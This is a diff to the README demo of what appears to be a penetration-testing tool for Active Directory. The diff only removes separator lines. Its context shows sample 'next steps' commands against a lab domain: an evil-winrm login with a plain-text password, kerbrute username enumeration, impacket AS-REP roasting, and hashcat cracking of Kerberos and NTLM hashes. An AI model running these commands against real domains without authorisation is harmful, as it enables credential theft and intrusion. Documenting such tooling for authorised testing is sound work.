@@ -76,16 +76,16 @@ Demo
         # evil-winrm
         evil-winrm -i 172.16.1.20 -u admin -p Password123!
 
-════════════════════════════════════════════════════════════
+
   🎯 Next Steps
-════════════════════════════════════════════════════════════
+
 
   Domain Controllers detected
-  ────────────────────────────────
+─
     ► DC01 (172.16.1.20) — corp.local
 
   No-auth AD attacks (try alongside any creds found above)
-  ────────────────────────────────
+
         # enumerate valid usernames at corp.local
         kerbrute userenum --dc 172.16.1.20 -d corp.local /usr/share/seclists/Usernames/Names/names.txt
 
@@ -93,7 +93,7 @@ Demo
         impacket-GetNPUsers corp.local/ -dc-ip 172.16.1.20 -request -no-pass -usersfile users.txt
 
   Cracking captured hashes
-  ────────────────────────────────
+
         # AS-REP (Kerberos 5 AS-REP)
         hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
 
@@ -102,7 +102,7 @@ Demo
 
         # NTDS / SAM (NTLM)
         hashcat -m 1000 ntds.hash /usr/share/wordlists/rockyou.txt
-════════════════════════════════════════════════════════════
+
 
 Features
 
